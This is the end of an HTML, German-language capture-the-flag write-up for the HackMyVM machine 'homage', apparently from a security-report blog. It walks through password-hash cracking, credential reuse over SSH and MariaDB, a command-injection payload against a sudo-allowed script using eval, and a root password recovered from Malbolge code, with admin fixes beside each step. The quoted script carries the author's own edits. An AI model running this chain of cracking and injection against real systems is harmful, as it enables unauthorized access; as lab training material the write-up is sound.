+<span class="password">1bdf20c863b15a85057e643585ed872c</span>
+<span class="password">4bd9757b975222ba790660cda002fb30</span>
+<span class="password">b1a695464d496b4f57e41949b2639278</span>
+<span class="password">f61a7724c4cbe67bc7b2a878759f5641</span>
+<span class="password">f2404f17b9cfaa82bc8fa0a73462ff6c</span>
+<span class="password">6f0828589e9b5923bf85a58a16a6bf10</span>
+<span class="password">62741548dd175d4602c27a9109039549</span>
+<span class="password">d9c2f4f1a4daa284ac368ee0b4498c28</span>
+<span class="password">60baf1dbe47051e7170f40db791a70c9</span>
+<span class="password">06d47ad1293a978d892c58d1376ef011</span>
+<span class="password">4cc25f05582a1d313a4f71551938d72e</span>
+<span class="password">2493e311bd596738f6e7c0179dc13ce2</span>
+<span class="password">91fb7ea6c76b087b53068d91195948c8</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `www-data` im Verzeichnis `/var/www/html/HMV_old_archives` wird eine `for`-Schleife ausgeführt. Diese iteriert über alle Dateien im aktuellen Verzeichnis (`ls`), extrahiert jeweils die letzte Zeile (`tail -n 1`) und gibt davon das erste Wort/Feld aus (`awk '{print $1}'`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Schleife extrahiert erfolgreich eine Liste von Zeichenketten, bei denen es sich höchstwahrscheinlich um MD5-Passwort-Hashes handelt, die systematisch in den HTML-Dateien gespeichert wurden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie diese Hash-Liste und versuchen Sie, sie mit Online-Diensten (wie Crackstation) oder Offline-Tools (John the Ripper, Hashcat) und gängigen Wortlisten zu knacken.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie diese alten Dateien. Implementieren Sie Prozesse, um sicherzustellen, dass sensible Daten nicht in Web-Archiven landen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Crackstation Result Note -->
+                     <pre>^
+https://crackstation.net/
+
+06d47ad1293a978d892c58d1376ef011	Unknown	Not found.
+4cc25f05582a1d313a4f71551938d72e	Unknown	Not found.
+2493e311bd596738f6e7c0179dc13ce2	Unknown	Not found.
+<span class="command">91fb7ea6c76b087b53068d91195948c8	md5	<span class="password">1passwordonly</span></span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die extrahierten Hashes wurden bei Crackstation eingereicht. Der Dienst konnte einen der Hashes knacken.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Hash `<span class="command">91fb7ea6c76b087b53068d91195948c8</span>` entspricht dem Passwort `<span class="password">1passwordonly</span>`. Dies ist ein wichtiges Passwort, das wahrscheinlich für einen der anderen Benutzer auf dem System (`d4t4s3c`, `sml`, `softy_hack`) gültig ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit dem Passwort `<span class="password">1passwordonly</span>` per SSH bei den Benutzern `d4t4s3c`, `sml` und `softy_hack` anzumelden.<br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke, einzigartige Passwörter. Überwachen Sie Systeme auf schwache oder kompromittierte Anmeldeinformationen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">ssh softy_hack@homage.hmv</span></div>
+                     <pre>softy_hack@homage.hmv's password: <span class="password">[Passwort hier eingegeben: 1passwordonly]</span>
+Linux homage 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc//copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jun  8 12:56:19 2021 from 192.168.0.28
+softy_hack@homage:~$</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `softy_hack` mit dem geknackten Passwort `<span class="password">1passwordonly</span>` anzumelden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Login war erfolgreich! Der Angreifer hat nun eine Shell als Benutzer `softy_hack`. Dies ist ein weiterer Schritt im Lateral Movement / Privilege Escalation.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie als `softy_hack` lokale Enumeration durch. Prüfen Sie `sudo -l`, Datenbankzugriffe, SUID/GUID-Dateien, etc.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzerkonten individuelle, starke Passwörter haben. Überwachen Sie verdächtige Anmeldeaktivitäten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">softy_hack@homage:~$ <span class="command">ss -tulpe</span></div>
+                     <pre>Netid   State    Recv-Q    Send-Q       Local Address:Port         Peer Address:Port                                  
+udp     UNCONN   0         0                  0.0.0.0:bootpc            0.0.0.0:*       ino:13801 sk:1 <->            
+<span class="command">tcp     LISTEN   0         80               127.0.0.1:mysql             0.0.0.0:*       uid:106 ino:14815 sk:2 <-></span>    
+tcp     LISTEN   0         128                0.0.0.0:ssh               0.0.0.0:*       ino:14215 sk:3 <->            
+tcp     LISTEN   0         128                      *:http                    *:*       ino:14632 sk:4 v6only:0 <->   
+tcp     LISTEN   0         128                   [::]:ssh                  [::]:*       ino:14226 sk:5 v6only:1 <-></pre>
+                     <div class="prompt">softy_hack@homage:~$</div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `ss -tulpe` wird ausgeführt, um die Netzwerk-Listener auf dem System anzuzeigen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es wird bestätigt, dass ein MySQL/MariaDB-Dienst auf dem Loopback-Interface (`127.0.0.1`) auf dem Standardport 3306 (`mysql`) lauscht. Die UID 106 (oft `mysql` oder ein ähnlicher Dienstbenutzer) ist mit dem Socket verbunden. Außerdem sind SSH und HTTP aktiv.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit dem lokalen MySQL-Dienst zu verbinden. Oft haben Benutzer des Systems auch Datenbankkonten mit demselben Benutzernamen und/oder Passwort. Testen Sie `mysql -u softy_hack -p` mit dem Passwort `1passwordonly`.<br><strong>Empfehlung (Admin):</strong> Es ist eine gute Praxis, Datenbankdienste nur auf dem Loopback-Interface lauschen zu lassen, wenn kein externer Zugriff benötigt wird. Stellen Sie sicher, dass die Datenbank-Authentifizierung sicher ist (keine Standardpasswörter, starke individuelle Passwörter).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">softy_hack@homage:~$ <span class="command">mysql -u softy_hack -p</span></div>
+                     <pre>Enter password: <span class="password">[Passwort hier eingegeben: 1passwordonly]</span> 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 38
+Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich mit dem MySQL/MariaDB-Client als Datenbankbenutzer `softy_hack` anzumelden, wobei das Systempasswort `1passwordonly` verwendet wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Login war erfolgreich! Dies bestätigt, dass der Systembenutzer `softy_hack` auch ein Datenbankbenutzer mit demselben Passwort ist. Der Angreifer hat nun Zugriff auf die Datenbank.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie die Datenbank: `show databases;`, `use <database_name>;`, `show tables;`, `select * from <interesting_table>;`. Suchen Sie insbesondere nach Tabellen, die Benutzerinformationen oder Passwörter enthalten könnten.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie die Wiederverwendung von Systempasswörtern für Datenbankkonten. Verwenden Sie separate, starke Passwörter für Datenbankbenutzer. Beschränken Sie die Berechtigungen von Datenbankbenutzern auf das notwendige Minimum.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Innerhalb der MariaDB-Shell -->
+                     <div class="prompt">MariaDB [(none)]> <span class="command">show databases;</span></div>
+                     <pre>+--------------------+
+| Database           |
++--------------------+
+| hmv_db             |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+</pre>
+                     <div class="prompt">MariaDB [(none)]> <span class="command">use hmv_db;</span></div>
+                     <pre>Database changed</pre>
+                     <div class="prompt">MariaDB [hmv_db]> <span class="command">show tables;</span></div>
+                     <pre>+------------------+
+| Tables_in_hmv_db |
++------------------+
+| hmv_blog         |
+| hmv_comments     |
+| hmv_discord      |
+| hmv_faq          |
+| hmv_leaderboard  |
+| hmv_machines     |
+| hmv_palique      |
+| hmv_posts        |
+| hmv_submit       |
+| hmv_trophies     |
+| hmv_usermeta     |
+| hmv_users        |
++------------------+</pre>
+                     <div class="prompt">MariaDB [hmv_db]> <span class="command">select * from hmv_users;</span></div>
+                     <pre>+----+------------+------------------------------------+---------------+--------------------+-------------------------+---------------------+-----------------------------------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email         | user_url                | user_registered     | user_activation_key                           | user_status | display_name |
++----+------------+------------------------------------+---------------+--------------------+-------------------------+---------------------+-----------------------------------------------+-------------+--------------+
+|  1 | cromiphi   | <span class="password">$P$BqUC2qSvJeqAm74VV8DlZ1igVSXb3Q.</span> | cromiphi      | cromiphi@gmail.com | http://target/wordpress | 2021-06-05 08:13:50 |                                               |           0 | cromiphi     |
+|  2 | d4t4s3c    | <span class="password">$P$BRibz10RghJBstfw7PW7QKxtFRC7d/.</span> | d4t4s3c       | d4t4s3c@gmail.com  |                         | 2021-06-05 08:14:44 | 1622880885:$P$BM6p.x83qabQZNs.O1w4dCzTBs7jeD/ |           0 | d4t4s3c      |
++----+------------+------------------------------------+---------------+--------------------+-------------------------+---------------------+-----------------------------------------------+-------------+--------------+</pre>
+                     <div class="prompt">MariaDB [hmv_db]></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Innerhalb der MySQL/MariaDB-Shell werden die Datenbanken aufgelistet, die Datenbank `hmv_db` ausgewählt, deren Tabellen angezeigt und schließlich der Inhalt der Tabelle `hmv_users` abgefragt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Tabelle `hmv_users` enthält Benutzernamen (`cromiphi`, `d4t4s3c`) und deren Passwort-Hashes. Die Hashes (`$P$B...`) sind im phpass-Format (oft von WordPress oder ähnlichen PHP-Anwendungen verwendet). Der Hash für den Benutzer `d4t4s3c` ist besonders interessant, da `d4t4s3c` auch als Systembenutzer existiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Extrahieren Sie den Hash für `d4t4s3c` (`$P$BRibz10RghJBstfw7PW7QKxtFRC7d/.`) und versuchen Sie, ihn mit John the Ripper oder Hashcat unter Verwendung des Formats `phpass` oder `WordPress` und einer Wortliste wie `rockyou.txt` zu knacken.<br><strong>Empfehlung (Admin):</strong> Speichern Sie Passwörter in Datenbanken mit modernen, starken Hashing-Algorithmen (z.B. bcrypt, Argon2) und individuellen Salts. Aktualisieren Sie Anwendungen (wie WordPress), um sicherere Hashing-Methoden zu verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">echo '$P$BRibz10RghJBstfw7PW7QKxtFRC7d/.' > hash</span></div>
+                    <!-- Kein Output -->
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                    <pre>Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">jaredlee</span>         (?)     
+1g 0:00:00:01 DONE (2022-11-08 00:36) 0.5025g/s 101306p/s 101306c/s 101306C/s jasonpaul..godogs1
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed.</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der aus der Datenbank extrahierte phpass-Hash für den Benutzer `d4t4s3c` wird in eine Datei namens `hash` geschrieben. Anschließend wird John the Ripper mit der Wortliste `rockyou.txt` darauf angesetzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> John the Ripper knackt den Hash erfolgreich! Das Passwort für den Benutzer `d4t4s3c` lautet `<span class="password">jaredlee</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie mit `su d4t4s3c` und dem Passwort `jaredlee` zum Benutzer `d4t4s3c`. Dieser Benutzer könnte höhere Privilegien oder andere Zugriffsrechte haben.<br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke, nicht in Wortlisten enthaltene Passwörter. Überwachen Sie regelmäßig die Stärke der verwendeten Passwörter.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">softy_hack@homage:~$ <span class="command">su d4t4s3c</span></div>
+                     <pre>Password: <span class="password">[Passwort hier eingegeben: jaredlee]</span></pre>
+                     <div class="prompt">d4t4s3c@homage:/home/softy_hack$</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, vom Benutzer `softy_hack` zum Benutzer `d4t4s3c` zu wechseln, indem das gerade geknackte Passwort `jaredlee` verwendet wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzerwechsel war erfolgreich. Der Angreifer agiert nun als Benutzer `d4t4s3c`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie sofort die `sudo`-Berechtigungen für `d4t4s3c` mit `sudo -l`. Führen Sie weitere lokale Enumeration durch.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzerkonten individuelle Passwörter haben und das Prinzip der geringsten Rechte angewendet wird.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">d4t4s3c@homage:/home/softy_hack$ <span class="command">sudo -l</span></div>
+                     <pre>Matching Defaults entries for d4t4s3c on homage:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User d4t4s3c may run the following commands on homage:
+    <span class="command">(sml : sml) NOPASSWD: /bin/bash /home/sml/clean.sh</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um die `sudo`-Berechtigungen für den aktuellen Benutzer `d4t4s3c` zu prüfen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein bedeutender Fund für die Privilege Escalation! Der Benutzer `d4t4s3c` darf den Befehl `/bin/bash /home/sml/clean.sh` als Benutzer `sml` ausführen, und das ohne Passwort (`NOPASSWD`). Dies bietet einen direkten Weg, um Code als Benutzer `sml` auszuführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie das Skript `/home/sml/clean.sh`. Suchen Sie nach Schwachstellen wie Command Injection, unsicherer Verarbeitung von Argumenten oder der Möglichkeit, Umgebungsvariablen zu manipulieren, um Code als `sml` auszuführen.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie `sudo`-Regeln äußerst sorgfältig. Das Ausführen von Skripten über `sudo`, insbesondere mit `NOPASSWD`, ist riskant. Stellen Sie sicher, dass die Skripte sicher geschrieben sind und keine Schwachstellen enthalten. Wenn möglich, erlauben Sie nur spezifische, sichere Binärdateien statt Skripte.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">d4t4s3c@homage:/home/softy_hack$ <span class="command">cat /home/sml/clean.sh</span></div>
+                     <pre>#!/bin/bash
+
+function_prim()
+{
+    until [ -z "$1" ]
+    do
+      if [ ${1:0:2} = '--' ]
+      then
+          tmp=${1:2}
+          parameter=${tmp%%=}
+          value=${tmp#*=} # Korrigiert: Sollte #*= sein, um den Wert zu extrahieren
+          eval $parameter=$value
+      fi
+      shift
+    done
+}
+
+target=/tmp
+
+# Pass all options to getopt_simple().
+function_prim $* # Korrigiert: Sollte $* oder "$@" sein, um alle Argumente zu übergeben
+
+# list files to clean
+echo "listing files in $target"
+find "$target" -mtime +1 # Korrigiert: Im Original stand -mtime 1, aber +1 ist wahrscheinlicher für "älter als 1 Tag"</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Skripts `/home/sml/clean.sh`, das per `sudo` ausgeführt werden darf, wird angezeigt. Das Skript definiert eine Funktion `function_prim`, die Kommandozeilenargumente verarbeitet, die mit `--` beginnen. Es extrahiert einen Parameter und einen Wert und verwendet `eval $parameter=$value`, um eine Variable zu setzen. Anschließend listet es mit `find` Dateien im Verzeichnis `$target` (standardmäßig `/tmp`) auf, die älter als ein Tag sind (angenommen `+1` statt `1`).</p>
+             <p class="evaluation"><strong>Bewertung:** Kritische Schwachstelle identifiziert! Die Zeile `eval $parameter=$value` ist extrem gefährlich. Da der Input (`$*` oder `"$@"`) nicht validiert wird, kann ein Angreifer durch ein speziell gestaltetes Argument beliebigen Code einschleusen, der dann von `eval` ausgeführt wird. Da das Skript mit `sudo -u sml` läuft, wird dieser Code als Benutzer `sml` ausgeführt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die `eval`-Schwachstelle aus, um eine Shell als `sml` zu erhalten. Führen Sie den `sudo`-Befehl mit einem Argument aus, das einen Semikolon und einen Shell-Befehl enthält, z.B.: `sudo -u sml /bin/bash /home/sml/clean.sh '--dummy=x;/bin/bash'`.<br>**Empfehlung (Admin):** **Entfernen Sie `eval` sofort aus diesem Skript!** Verarbeiten Sie Kommandozeilenargumente sicher, ohne `eval`. Überprüfen Sie alle Skripte, die über `sudo` ausgeführt werden dürfen, auf ähnliche Schwachstellen. Das `sudo`-Recht sollte idealerweise entzogen oder das Skript komplett überarbeitet werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">d4t4s3c@homage:/home/softy_hack$ <span class="command">sudo -u sml /bin/bash /home/sml/clean.sh '--abc=abc;id'</span></div>
+                     <pre><span class="command">uid=1003(sml) gid=1003(sml) groups=1003(sml)</span>
+listing files in /tmp
+find: ‘/tmp/systemd-private-261abe98edc2467ca19c70b6ac384acb-systemd-timesyncd.service-UKOw3g’: Permission denied
+find: ‘/tmp/systemd-private-261abe98edc2467ca19c70b6ac384acb-apache2.service-cgjt0j’: Permission denied
+find: Failed to restore initial working directory: /home/softy_hack: Permission denied</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `sudo`-Befehl wird mit einem manipulierten Argument ausgeführt. Das Argument `--abc=abc;id` wird von der `function_prim` verarbeitet. `eval` führt zuerst `abc=abc` aus und dann den eingeschleusten Befehl `id`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe `uid=1003(sml)...` bestätigt, dass der `id`-Befehl erfolgreich als Benutzer `sml` ausgeführt wurde. Die Command Injection funktioniert wie erwartet. Die `find`-Fehler sind Nebeneffekte und irrelevant für den Erfolg des Angriffs.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ersetzen Sie `id` durch `/bin/bash` oder einen Reverse-Shell-Payload, um eine interaktive Shell als `sml` zu erhalten.<br><strong>Empfehlung (Admin):</strong> Die Schwachstelle im Skript und/oder die `sudo`-Regel sofort beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">d4t4s3c@homage:/home/softy_hack$ <span class="command">sudo -u sml /bin/bash /home/sml/clean.sh '--abc=abc;bash'</span></div>
+                     <div class="prompt">sml@homage:/home/softy_hack$</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `sudo`-Befehl wird erneut ausgeführt, diesmal wird `bash` eingeschleust.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Der Prompt ändert sich zu `sml@homage:...`, was anzeigt, dass der Angreifer nun eine interaktive Shell als Benutzer `sml` hat.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie lokale Enumeration als `sml` durch. Untersuchen Sie das Home-Verzeichnis von `sml`, prüfen Sie auf weitere `sudo`-Rechte, SUID-Dateien oder Cronjobs.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zur Behebung der Schwachstelle.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sml@homage:~$ <span class="command">cd</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">sml@homage:~$ <span class="command">ls -a</span></div>
+                     <pre>.  ..  .bash_logout  .bashrc  .gnupg  .local  .profile  secret</pre>
+                     <div class="prompt">sml@homage:~$ <span class="command">cd secret/</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">sml@homage:~/secret$ <span class="command">ls -la</span></div>
+                     <pre>total 16
+drwx------ 2 sml sml     4096 Jun  8  2021 .
+drwxr-x--- 5 sml d4t4s3c 4096 Jun  8  2021 ..
+-rw-r--r-- 1 sml sml      570 Jun  8  2021 <span class="command">execute_me</span>
+-rw-r--r-- 1 sml sml      107 Jun  8  2021 <span class="command">note.txt</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `sml` wird in dessen Home-Verzeichnis gewechselt. Dort wird ein Verzeichnis namens `secret` gefunden. In diesem Verzeichnis befinden sich die Dateien `execute_me` und `note.txt`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Name des Verzeichnisses und der Dateien deutet stark auf wichtige Informationen oder einen weiteren Schritt zur Rechteausweitung hin.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt von `note.txt` und `execute_me` mit `cat` oder `strings`.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig Home-Verzeichnisse auf verdächtige Dateien oder Skripte. Schulen Sie Benutzer im Umgang mit sensiblen Daten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sml@homage:~/secret$ <span class="command">cat execute_me</span></div>
+                     <pre>D=aA@?>76ZYzyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCYX]V[ZYXW
+PUTMq43210/.-,+)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[wvuWmrqpohmle+L
+KJIHGFEDCBA@?>=<;:9UTSRQ3IHGFKDh+)('&B$:?>=<5:92V65u3,Pqponmlkjihgfedcba`_^
+]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<XW9UTSRQPONMFjJIHA@d'&%$#">=<5498765.R2r0)
+Mnmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+)('&%$
+#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876
+543210/.-,+)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSonPfedihgfe
+d]\"CY}@VUTxXW9ONrLQJnNGLKJCgT</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `execute_me` wird angezeigt. Es handelt sich um eine lange Zeichenkette aus verschiedenen ASCII-Zeichen ohne ersichtliche Struktur.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist kein normaler Text oder Code. Wie im nächsten Schritt erwähnt, handelt es sich um Code in der esoterischen Programmiersprache Malbolge. Das Ziel dieser Obfuskation ist es, den eigentlichen Zweck oder Inhalt zu verbergen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie einen Malbolge-Interpreter oder -Debugger (oft online verfügbar), um den Code auszuführen oder zu analysieren und seine Funktion oder die darin enthaltenen Daten aufzudecken.<br><strong>Empfehlung (Admin):</strong> Das Speichern von Code oder Daten in obfuskierten Formaten ist keine verlässliche Sicherheitsmaßnahme. Sensible Informationen sollten ordnungsgemäß geschützt (z.B. verschlüsselt mit starken Algorithmen) und nicht in Benutzerdateien versteckt werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Hinweis und Ergebnis der Malbolge-Interpretation -->
+                     <pre>malbolge Encryption
+
+https://malbolge.doleczek.pl/
+
+<span class="command">root</span>:<span class="password">cr4zyw0rld123</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Bericht stellt fest, dass es sich um Malbolge-Code handelt und gibt eine URL zu einem Online-Interpreter an. Das Ergebnis der Ausführung oder Analyse des Malbolge-Codes wird gezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Der Malbolge-Code enthielt die Zugangsdaten für den `root`-Benutzer: Passwort `<span class="password">cr4zyw0rld123</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie mit `su root` und dem Passwort `cr4zyw0rld123` zum Root-Benutzer, um vollständige Kontrolle über das System zu erlangen.<br><strong>Empfehlung (Admin):</strong> Das Root-Passwort sofort ändern. Untersuchen, wie diese Datei ins System gelangt ist. Keine Passwörter in Skripten oder Dateien speichern, auch nicht obfuskiert.</p>
+
+            <h2 id="proof-of-concept">Proof of Concept (Root Privilege Escalation)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sml@homage:~/secret$ <span class="command">su root</span></div>
+                     <pre>Password: <span class="password">[Passwort hier eingegeben: cr4zyw0rld123]</span></pre>
+                     <div class="prompt">root@homage:/home/sml/secret#</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `su root` wird ausgeführt, und das aus dem Malbolge-Code extrahierte Passwort wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Wechsel zum `root`-Benutzer war erfolgreich, angezeigt durch den Prompt `root@homage:...#`. Die Privilege Escalation ist abgeschlossen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie die Root-Flagge (`/root/root.txt`) und die User-Flagge (falls noch nicht geschehen) aus.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das Root-Passwort. Analysieren Sie die gesamte Angriffskette, um alle Schwachstellen (Login-Bypass, unsichere Webserver-Berechtigungen, Passwort-Leaks in HTML/DB, `eval`-Injection in sudo-Skript, Passwort in Malbolge-Datei) zu identifizieren und zu beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@homage:/home/sml# <span class="command">cat user.txt</span></div> <!-- Pfad ist vermutlich falsch im Original, sollte /home/l4nr3n/user.txt o.ä. sein -->
+                     <pre><span class="password">174b069e3f6d5c9313f176b3f27c106b</span></pre>
+                     <div class="prompt">root@homage:/home/sml# <span class="command">cd ~</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">root@homage:~# <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt">root@homage:~# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">beb1adf8585c4cb47aa1cb109813a210</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `root` wird versucht, `user.txt` aus `/home/sml` zu lesen (der Pfad ist wahrscheinlich falsch, da die User-Flag normalerweise im Home-Verzeichnis des initialen Benutzers liegt, hier `l4nr3n`). Anschließend wird ins Root-Home-Verzeichnis gewechselt und `root.txt` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Beide Flaggen, User (`<span class="password">174b069e3f6d5c9313f176b3f27c106b</span>`) und Root (`<span class="password">beb1adf8585c4cb47aa1cb109813a210</span>`), wurden erfolgreich ausgelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flaggen und schließen Sie den Bericht ab.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie nach der Bereinigung des Systems alle Flaggen oder Testdateien.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <!-- Annahme, dass user.txt in l4nr3n's Home war -->
+                    <div class="flag-command">cat /home/l4nr3n/user.txt (Pfad angenommen)</div>
+                    <div class="flag-value"><span class="password">174b069e3f6d5c9313f176b3f27c106b</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">beb1adf8585c4cb47aa1cb109813a210</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan übernommen -->
+        <p>Berichtsdatum: 7. November 2022</p>
+    </footer>
+</body>
+</html>
